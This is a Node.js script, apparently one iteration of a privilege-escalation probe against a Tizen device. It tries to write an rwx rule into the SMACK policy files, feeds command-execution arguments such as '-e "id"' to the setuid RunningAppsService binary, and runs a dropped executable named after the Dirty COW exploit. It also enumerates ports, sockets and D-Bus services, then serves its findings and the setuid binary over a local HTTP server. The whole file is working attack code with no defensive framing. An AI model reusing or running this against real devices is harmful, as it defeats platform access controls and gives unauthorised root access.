// v28 - investigate RunningAppsService + smack load2 + sdb daemon check
// Pull server: 8108 (main) + /ras for RunningAppsService binary
try {
  var fs  = require('fs');
  var cp  = require('child_process');
  var http = require('http');
  var lines = ['=== ras-smack v28 ==='];

  var RAS = '/usr/bin/RunningAppsService';
  var WUTIL = '/usr/bin/wasutility';

  // Step 1: stat both setuid bins
  [RAS, WUTIL].forEach(function(p) {
    try {
      var st = fs.statSync(p);
      lines.push('stat ' + p + ': sz=' + st.size + ' mode=0' + st.mode.toString(8) + ' uid=' + st.uid);
    } catch(e) { lines.push('stat ' + p + ': ' + String(e.code||e.message)); }
  });

  // Step 2: try writing exec rule to smackfs
  ['load', 'load2'].forEach(function(f) {
    try {
      fs.appendFileSync('/sys/fs/smackfs/' + f, 'User::Pkg::xvvl3S1bvH User::Pkg::xvvl3S1bvH rwx\n');
      lines.push('smack_' + f + ': OK (wrote exec rule)');
    } catch(e) { lines.push('smack_' + f + ': ' + String(e.code||e.message).substring(0,80)); }
  });

  // Step 3: try RunningAppsService with various args
  ['', '-h', '--help', '--version', '-V', '-l', '-s', '-k', '-e "id"', '-c "id"'].forEach(function(arg, i) {
    try {
      var r = cp.execSync(RAS + (arg ? ' ' + arg : '') + ' 2>&1', {timeout:5000}).toString().trim();
      lines.push('ras[' + i + ']=' + (arg||'(noarg)') + ': exit0 out=' + r.substring(0,100));
    } catch(ex) {
      var msg = String(ex.stderr||ex.stdout||'').trim().substring(0,100) + ' status=' + (ex.status||'?');
      lines.push('ras[' + i + ']=' + (arg||'(noarg)') + ': ' + msg);
    }
  });

  // Step 4: check if exec works after smack rule add
  var DCOW = '/tmp/dirtycow_was_v27';
  try {
    var out = cp.execSync(DCOW + ' 2>&1', {timeout:5000}).toString().trim();
    lines.push('exec_after_smack_rule: OK out=' + out.substring(0,100));
  } catch(e) {
    lines.push('exec_after_smack_rule: ' + String(e.stderr||e.message||e.code).substring(0,100));
  }

  // Step 5: check network for privileged services
  try {
    var tcp = fs.readFileSync('/proc/net/tcp', 'utf8');
    var tcpLines = tcp.split('\n').slice(1).filter(function(l){ return l.trim(); });
    // Show listening sockets (st=0A)
    var listening = tcpLines.filter(function(l){ return l.indexOf(' 0A ') !== -1; });
    lines.push('tcp_listening: ' + listening.length + ' ports: ' + listening.slice(0,10).map(function(l){
      var parts = l.trim().split(/\s+/);
      var localHex = parts[1]; // local_addr:port in hex
      var portHex = localHex.split(':')[1];
      return parseInt(portHex, 16);
    }).join(', '));
  } catch(e) {}

  // Step 6: check sdb daemon
  try {
    var pstree = cp.execSync('ps aux 2>/dev/null | grep -i sdb', {timeout:3000}).toString().trim();
    lines.push('sdb_procs: ' + pstree.substring(0,200));
  } catch(e) {}

  // Step 7: check /proc/net/unix for privileged sockets
  try {
    var unix = fs.readFileSync('/proc/net/unix', 'utf8');
    var sockLines = unix.split('\n').filter(function(l){
      return l.indexOf('/') !== -1 && (l.indexOf('smack') !== -1 || l.indexOf('security') !== -1 || l.indexOf('tizen') !== -1 || l.indexOf('appservice') !== -1);
    });
    lines.push('unix_socks_interesting: ' + JSON.stringify(sockLines.slice(0,10)));
  } catch(e) {}

  // Step 8: check our process D-Bus capabilities
  try {
    var dbus = cp.execSync('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1', {timeout:5000}).toString().trim();
    lines.push('dbus_names: ' + dbus.substring(0,300));
  } catch(e) {
    lines.push('dbus_names: ' + String(e.message||e.code).substring(0,100));
  }

  // Step 9: serve RunningAppsService binary (chunked if large)
  var rasBuf = null;
  try { rasBuf = fs.readFileSync(RAS); } catch(e) {}

  var body = lines.join('\n') + '\n=== END ===\n';
  try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe28.txt', body); } catch(e3) {}
  var srv = http.createServer(function(req, res) {
    if (req.url === '/ras' && rasBuf) {
      res.writeHead(200, {'Content-Type': 'application/octet-stream', 'Content-Length': rasBuf.length});
      res.end(rasBuf);
    } else {
      res.writeHead(200, {'Content-Type': 'text/plain'});
      res.end(body);
    }
  });
  srv.listen(8108, '127.0.0.1', function() {});
  srv.on('error', function(e) {});
  setInterval(function() {}, 60000);
} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe28-crash.txt', String(e.stack||e.message).substring(0, 500)); } catch(e2) {}
}
